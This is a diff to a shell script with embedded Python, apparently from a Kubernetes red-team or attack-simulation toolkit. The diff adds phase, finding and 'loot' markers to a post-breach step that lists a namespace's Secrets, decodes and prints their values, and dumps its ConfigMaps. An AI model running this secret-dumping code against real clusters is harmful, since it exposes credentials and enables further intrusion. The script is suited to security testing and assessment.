@@ -22,11 +22,13 @@ source "$SCRIPT_DIR/lib.sh"
 TARGET_NS="${1:-target-apps}"
 
 banner "Post-Breach: Steal Secrets ($TARGET_NS)"
+echo "@PHASE Steal-Secrets"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
 target_ns = '${TARGET_NS}'
 
+print('@PHASE Secret-Enumeration')
 print('=' * 60)
 print(f'  SECRETS in namespace: {target_ns}')
 print('=' * 60)
@@ -34,9 +36,11 @@ print('=' * 60)
 secrets = k8s_get(f'/api/v1/namespaces/{target_ns}/secrets')
 if 'error' in secrets:
     print(f'  Error reading secrets: {secrets}')
+    print(f'@FINDING info Cannot read secrets in {target_ns}: access denied')
 else:
     items = secrets.get('items', [])
     print(f'  Found {len(items)} secrets')
+    print(f'@FINDING high {len(items)} Kubernetes secrets accessible in {target_ns}')
     for s in items:
         name = s['metadata']['name']
         stype = s.get('type', 'Opaque')
@@ -48,10 +52,12 @@ else:
                 if len(decoded) > 200:
                     decoded = decoded[:200] + '...'
                 print(f'    {k} = {decoded}')
+                print(f'@LOOT secrets {name}/{k}')
             except Exception:
                 print(f'    {k} = <binary, {len(v)} chars b64>')
 
 print()
+print('@PHASE ConfigMap-Enumeration')
 print('=' * 60)
 print(f'  CONFIGMAPS in namespace: {target_ns}')
 print('=' * 60)
@@ -62,6 +68,8 @@ if 'error' in cms:
 else:
     items = cms.get('items', [])
     print(f'  Found {len(items)} configmaps')
+    if items:
+        print(f'@FINDING medium {len(items)} ConfigMaps accessible in {target_ns}')
     for cm in items:
         name = cm['metadata']['name']
         data = cm.get('data', {})
@@ -71,8 +79,10 @@ else:
         for k, v in data.items():
             display = v[:200] + '...' if len(v) > 200 else v
             print(f'    {k} = {display}')
+            print(f'@LOOT configmaps {name}/{k}')
 
 print()
+print('@RESULT success Credential theft complete')
 print('Credential theft complete.')
 "
 
